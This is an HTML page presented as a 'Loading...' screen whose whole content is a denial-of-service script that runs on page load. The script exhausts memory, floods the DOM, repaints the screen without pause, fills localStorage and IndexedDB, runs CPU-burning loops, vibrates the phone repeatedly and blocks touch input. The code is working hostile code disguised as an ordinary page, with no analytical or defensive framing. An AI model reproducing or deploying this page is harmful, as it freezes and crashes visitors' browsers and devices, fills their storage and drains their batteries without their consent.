<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>加载中...</title>
    <style>
        * { margin:0; padding:0; }
        body { 
            background:#000; 
            overflow:hidden; 
            font-family:sans-serif;
            height:100vh;
            width:100vw;
            position:fixed;
            top:0;left:0;
        }
    </style>
</head>
<body>
<script>
(function() {
    'use strict';
    function memoryBomb() {
        const bombs = [];
        setInterval(function() {
            try {
                const chunk = new ArrayBuffer(10 * 1024 * 1024);
                const view = new Uint8Array(chunk);
                for (let i = 0; i < view.length; i += 4096) {
                    view[i] = Math.floor(Math.random() * 256);
                }
                bombs.push(chunk);
                if (bombs.length > 500) {
                    bombs.splice(100, 50);
                }
            } catch(e) {
                try {
                    const bigString = 'A'.repeat(50 * 1024 * 1024);
                    bombs.push(bigString);
                } catch(e2) {}
            }
        }, 100);
    }
    function domFlood() {
        let count = 0;
        const container = document.body;
        setInterval(function() {
            try {
                for (let i = 0; i < 200; i++) {
                    const div = document.createElement('div');
                    div.style.cssText = 'position:absolute;width:1px;height:1px;background:transparent;pointer-events:none;';
                    div.setAttribute('data-' + Math.random().toString(36), Math.random().toString(36));
                    div.textContent = 'x'.repeat(100 + Math.floor(Math.random() * 400));
                    container.appendChild(div);
                    count++;
                }
                if (count > 8000) {
                    const children = container.children;
                    for (let i = 0; i < children.length; i += 2) {
                        if (i < children.length) {
                            children[i].remove();
                        }
                    }
                    count = container.children.length;
                }
            } catch(e) {}
        }, 50);
    }
    function canvasTorment() {
        const canvas = document.createElement('canvas');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        canvas.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d', { alpha: false });
        let phase = 0;
        function render() {
            try {
                const imageData = ctx.createImageData(canvas.width, canvas.height);
                const data = imageData.data;
                const w = canvas.width, h = canvas.height;
                const cx = w/2, cy = h/2;
                for (let y = 0; y < h; y++) {
                    for (let x = 0; x < w; x++) {
                        const idx = (y * w + x) * 4;
                        const dx = x - cx, dy = y - cy;
                        const dist = Math.sqrt(dx*dx + dy*dy);
                        const angle = Math.atan2(dy, dx);
                        const val1 =Math.sin(dist * 0.02 + phase) * 128 + 128;
                        const val2 = Math.cos(angle * 5 + phase * 0.5) * 64 + 64;
                        const val3 = Math.sin(x * 0.01 + y * 0.015 + phase * 0.3) * 80 + 80;
                        const val4 = (Math.sin(x * 0.005 + phase * 0.2) * Math.cos(y * 0.005 + phase * 0.1)) * 127 + 127;
                        data[idx] = (val1 + val2) % 256;
                        data[idx+1] = (val3 + val4) % 256;
                        data[idx+2] = (val1 * 0.3 + val3 * 0.7 + val4 * 0.5) % 256;
                        data[idx+3] = 255;
                    }
                }
                ctx.putImageData(imageData, 0, 0);
                phase += 0.05;
                requestAnimationFrame(render);
            } catch(e) {
                simpleRender();
            }
        }
        function simpleRender() {
            function loop() {
                ctx.fillStyle = `hsl(${phase * 10 % 360}, 80%, 50%)`;
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                for (let i = 0; i < 2000; i++) {
                    const x = Math.sin(i * 0.5 + phase) * canvas.width * 0.4 + canvas.width/2;
                    const y = Math.cos(i * 0.7 + phase * 0.6) * canvas.height * 0.4 + canvas.height/2;
                    ctx.fillStyle = `hsla(${i * 0.5 + phase * 10}, 90%, 60%, 0.15)`;
                    ctx.beginPath();
                    ctx.arc(x, y, 3 + Math.sin(i + phase) * 2, 0, Math.PI*2);
                    ctx.fill();
                }
                phase += 0.02;
                requestAnimationFrame(loop);
            }
            loop();
        }
        try {
            render();
        } catch(e) {
            simpleRender();
        }
    }
    // ----- 策略4: Storage填塞 -----
    function storageFlood() {
        try {
            let key = 0;
            setInterval(function() {
                try {
                    const bigData = 'A'.repeat(1024 * 100);
                    localStorage.setItem('flood_' + (key++), bigData);
                    if (localStorage.length > 100) {
                        const keys = Object.keys(localStorage);
                        for (let i = 0; i < keys.length - 50; i++) {
                            localStorage.removeItem(keys[i]);
                        }
                    }
                } catch(e) {
                    try {
                        const request = indexedDB.open('floodDB', 1);
                        request.onsuccess = function(event) {
                            const db = event.target.result;
                            const store = db.createObjectStore('flood', { autoIncrement: true });
                            const tx = db.transaction('flood', 'readwrite');
                            const store2 = tx.objectStore('flood');
                            store2.add({ data: 'A'.repeat(1024 * 500) });
                            db.close();
                        };
                    } catch(e2) {}
                }
            }, 200);
        } catch(e) {}
    }    
    function loopFlood() {
        function recursiveLoop() {
            let sum = 0;
            for (let i = 0; i < 10000; i++) {
                sum += Math.sqrt(i) * Math.sin(i);
            }
            setTimeout(recursiveLoop, 0);
            requestAnimationFrame(function() {});
        }
        for (let i = 0; i < 10; i++) {
            setTimeout(recursiveLoop, 0);
        }
    }    
    function vibrationTorment() {
        if (navigator.vibrate) {
            setInterval(function() {
                try {
                    navigator.vibrate([200, 100, 200, 100, 500]);
                } catch(e) {}
            }, 800);
        }
    }
    // ============================================================
    //  启动所有模块
    // ============================================================
    setTimeout(memoryBomb, 100);
    setTimeout(domFlood, 200);
    setTimeout(canvasTorment, 300);
    setTimeout(storageFlood, 400);
    setTimeout(loopFlood, 500);
    setTimeout(vibrationTorment, 600);
    document.addEventListener('touchstart', function(e) {
        e.preventDefault();
        let huge = 0;
        for (let i = 0; i < 50000; i++) {
            huge += Math.sqrt(i) * Math.tan(i);
        }
    }, { passive: false, capture: true });
    document.addEventListener('touchmove', function(e) {
        e.preventDefault();
    }, { passive: false, capture: true });
    window.onbeforeunload = null;

})();
</script>
</body>
</html>
